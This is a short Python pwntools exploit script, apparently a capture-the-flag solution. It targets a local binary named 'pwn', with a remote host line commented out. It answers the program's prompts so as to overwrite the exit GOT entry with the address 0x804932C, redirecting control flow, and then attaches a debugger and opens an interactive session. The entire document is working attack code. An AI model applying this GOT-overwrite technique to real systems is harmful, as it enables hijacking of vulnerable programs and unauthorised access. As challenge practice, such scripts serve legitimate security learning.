from pwn import *
context.log_level="debug"
sh=process("./pwn")
# sh=remote("116.236.144.37",24835)
elf=ELF("./pwn")
exit_got=elf.got['exit']
target=hex(exit_got)[2:].encode()
value=hex(0x804932C)[2:].encode()
sh.sendlineafter(b"write?\n", target)
sh.sendlineafter(b"?",value)
gdb.attach(sh,"b *0x0804932C\nc")
sh.sendlineafter(b"segment fault!\n",'niahoaos')
sh.interactive()